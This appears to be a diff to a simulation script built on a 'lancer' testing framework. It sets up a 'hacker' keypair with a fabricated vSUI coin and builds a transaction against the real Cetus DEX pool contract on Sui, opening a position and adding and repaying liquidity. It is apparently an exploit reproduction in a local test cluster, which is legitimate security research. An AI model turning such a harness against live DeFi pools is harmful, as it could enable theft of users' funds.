@@ -26,6 +26,7 @@ let { SuiAddress, ? } = import! lancer.sui.sui_address
 let { Digest, ? } = import! lancer.sui.digest
 let { Coin, coin_to_bytes } = import! lancer.framework
 let { Owner, ? } = import! lancer.rpc.types
+let { from_int } = import! lancer.types.uint
 
 let {
     TestCluster,
@@ -45,6 +46,7 @@ let {
     u16,
     u32,
     u64,
+    u128,
     bool,
     address,
     object_ref,
@@ -54,20 +56,10 @@ let {
     pay,
 } = import! lancer.effect.transaction_builder
 
-do objects = read_dir "objects"
-for objects <| \entry ->
-    if entry.metadata.is_file then
-        do data = read_file_to_string entry.path
-        let obj : ObjectPtr = unwrap_ok <| deserialize data
-        add_object obj
-    else
-        wrap ()
-
 let sui_framework : SuiAddress = unwrap_ok <| parse "0x0000000000000000000000000000000000000000000000000000000000000002"
-
+let clock_id : SuiAddress = unwrap_ok <| parse "0x0000000000000000000000000000000000000000000000000000000000000006"
 let cetus : SuiAddress = unwrap_ok <| parse "0xc6faf3703b0e8ba9ed06b7851134bbbe7565eb35ff823fd78432baa4cbeaa12e"
 let global_config_id : SuiAddress = unwrap_ok <| parse "0xdaa46292632c3c4d8f31f23ea0f9b36a28ff3677e9684980e4438403a67a3d8f"
-
 let vsui_type: StructTag = {
     address = unwrap_ok <| parse "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55",
     module = "cert",
@@ -89,6 +81,16 @@ let position_type: StructTag = {
 }
 
 let vsui_sui_pool_id : SuiAddress = unwrap_ok <| parse "0x6c545e78638c8c1db7a48b282bb8ca79da107993fcb185f75cedc1f5adb2f535"
+
+
+do objects = read_dir "objects"
+for objects <| \entry ->
+    if entry.metadata.is_file then
+        do data = read_file_to_string entry.path
+        let obj : ObjectPtr = unwrap_ok <| deserialize data
+        add_object obj
+    else
+        wrap ()
 
 do hacker = generate_keypair
 
@@ -120,6 +122,34 @@ let hackers_sui_object = from_inner_object {
 
 add_object hackers_sui_object
 
+let hackers_vsui_id : SuiAddress = unwrap_ok <| parse "0x1b444811bdb14c1689c46012231d7a86e672327f75034a14784a3846482d5c09"
+let hackers_vsui_digest : Digest = unwrap_ok <| parse "xPxJ2Mc8nAJrSJoKy3chKSjCFuhcAruh95MPoZ6s2iW"
+
+let hackers_vsui_object = from_inner_object {
+    data = Move {
+        type_ = {
+            address = sui_framework,
+            module = "coin",
+            name = "Coin",
+            type_params = [Struct vsui_type],
+        },
+        version = 1,
+        contents = coin_to_bytes {
+            id = {
+                id = hackers_vsui_id,
+            },
+            balance = {
+                value = 100000000000,
+            }
+        },
+    },
+    owner = AddressOwner hacker,
+    previous_transaction = hackers_vsui_digest,
+    storage_rebate = 0,
+}
+
+add_object hackers_vsui_object
+
 initialize
 
 do pool = get_object vsui_sui_pool_id
@@ -132,6 +162,7 @@ do hackers_sui_data = get_object hackers_sui_id
 
 log <| "Pool owner: " ++ show pool.owner
 log <| "Pool id: " ++ (show <| object_id <| from_inner_object pool)
+log "ooo"
 do r = execute_tx 500000000 hacker (
     do global_config_arg = object_ref <| SharedObject {
         id = global_config_id,
@@ -145,11 +176,34 @@ do r = execute_tx 500000000 hacker (
     }
     do tick_lower_arg = u32 0
     do tick_upper_arg = u32 2
+    // log "before open_position"
     do position_arg = move_call cetus "pool" "open_position" [ Struct vsui_type, Struct sui_type ] [
         global_config_arg,
         pool_arg,
         tick_lower_arg,
         tick_upper_arg
+    ]
+    do delta_liquidity_arg = u128 <| unwrap_ok <| from_int 10000
+    do clock_arg = object_ref <| SharedObject {
+        id = clock_id,
+        initial_shared_version = 1,
+        mutable = False,
+    }
+    do add_liquidity_receipt_arg = move_call cetus "pool" "add_liquidity" [  Struct vsui_type, Struct sui_type ] [
+        global_config_arg,
+        pool_arg,
+        position_arg,
+        delta_liquidity_arg,
+        clock_arg
+    ]
+    do vsui_coin_arg = object_ref <| ImmOrOwnedObject (hackers_vsui_id, 1, hackers_vsui_digest)
+    do sui_coin_arg = object_ref <| ImmOrOwnedObject (hackers_sui_id, 1, hackers_sui_digest)
+    move_call cetus "pool" "repay_add_liquidity" [  Struct vsui_type, Struct sui_type ] [
+        global_config_arg,
+        pool_arg,
+        vsui_coin_arg,
+        sui_coin_arg,
+        add_liquidity_receipt_arg
     ]
     do hacker_arg = address hacker
     move_call sui_framework "transfer" "public_transfer" [Struct position_type] [
